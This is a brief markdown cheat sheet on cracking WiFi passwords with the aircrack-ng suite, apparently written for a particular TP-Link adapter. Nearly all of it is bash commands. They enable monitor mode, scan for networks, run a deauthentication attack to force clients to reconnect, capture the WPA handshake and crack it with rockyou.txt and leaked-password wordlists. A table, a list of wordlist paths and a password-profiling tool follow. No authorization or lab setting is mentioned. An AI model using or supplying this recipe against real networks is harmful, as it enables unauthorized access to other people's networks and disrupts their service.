# WiFi Cracking Guide

## Quick Start

### 1. Enable Monitor Mode
```bash
sudo airmon-ng start wlan0
# Now shows as wlan0mon
```

### 2. Scan Networks
```bash
sudo airodump-ng wlan0mon
# Note: BSSID (MAC), Channel (CH), ESSID (name)
```

### 3. Capture Handshake
```bash
# Terminal 1: Capture
sudo airodump-ng -c CH --bssid MAC -w capture wlan0mon

# Terminal 2: Deauth attack (force reconnect)
sudo aireplay-ng --deauth 10 -a MAC wlan0mon
```

### 4. Crack Password
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## Common Commands

| Command | Use |
|---------|-----|
| `airmon-ng start wlan0` | Monitor mode |
| `airodump-ng wlan0mon` | Scan networks |
| `aireplay-ng --deauth 5 -a MAC wlan0mon` | Deauth |
| `aircrack-ng -w wordlist.cap` | Crack |
| `wash -i wlan0mon` | WPS networks |

---

## Best Wordlists

```bash
# Location
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/

# Custom
/opt/cupp/cupp.py -i  # Interactive
```

---

## Your Adapter: TP-Link TL-WN721N

✅ **Works great!** Chipset: AR9271

- Monitor mode: ✅ Yes
- Injection: ✅ Yes
- 2.4GHz only: ⚠️ (no 5GHz)
